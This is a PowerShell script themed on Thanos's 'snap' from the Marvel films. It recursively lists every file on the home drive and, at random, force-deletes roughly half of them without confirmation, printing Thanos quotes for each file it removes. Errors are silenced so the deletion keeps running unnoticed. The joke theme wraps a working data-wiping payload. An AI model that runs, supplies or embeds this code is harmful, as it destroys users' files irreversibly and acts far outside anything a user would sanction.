$ErrorActionPreference = "SilentlyContinue"
Function Thanos () {
    $rand = (Get-Random -Minimum 1 -Maximum 100) % 2
    if ($rand -eq 0) {
        return $false
    }
    else {
        return $true
    }
}

Function QuotePurge (){
    $purgeQuote = @(
        "You're strong. But I could snap my fingers, and you’d all cease to exist",
        "Fun isn’t something one considers when balancing the universe. But this… does put a smile on my face",
        "When I’m done, half of humanity will still exist. Perfectly balanced, as all things should be. I hope they remember you",
        "Going to bed hungry. Scrounging for scraps. Your planet was on the brink of collapse. I was the one who stopped that.",
        "I ignored my destiny once, I can not do that again. Even for you. I’m sorry Little one",
        "Your optimism is misplaced, Asgardian",
        "The hardest choices require the strongest wills"
    )
    $RNG = Get-Random -Maximum ($purgeQuote.Length - 1)
    return $purgeQuote[$RNG]
}

Try {
    $everything = gci $env:HOMEDRIVE -Rec -Force -file
}Catch {
    $_ | Out-Null
}

Write-Host -ForegroundColor Red "Running: Snap! on $($everything.Count) files"


ForEach ($thing in $everything) {
    if ((Thanos)) {
        Try{
            Write-Host -ForegroundColor Red "$(QuotePurge) : $($thing.FullName)..."
            $thing | rm -Force -Confirm:$false
        }Catch{
            $_ | Out-Null
        }
    }else{
        Write-Host -ForegroundColor Cyan "Thanos is merciful, spared: $($thing.FullName)"
    }
}
